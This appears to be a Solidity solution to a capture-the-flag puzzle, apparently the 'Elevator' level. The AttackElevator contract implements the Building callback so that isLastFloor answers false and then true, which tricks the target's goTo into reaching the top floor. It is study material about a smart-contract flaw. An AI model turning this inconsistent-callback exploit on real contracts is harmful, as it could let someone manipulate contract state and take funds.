// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

interface IElevator {
    function goTo(uint _floor) external;
}

contract AttackElevator is Building {
    bool private _flag;

    function attack(IElevator target) external {
        target.goTo(0);
    }

    function isLastFloor(uint) external returns (bool){
        if (!_flag) {
            _flag = true;
            return false;
        }

        return true;
    }
}
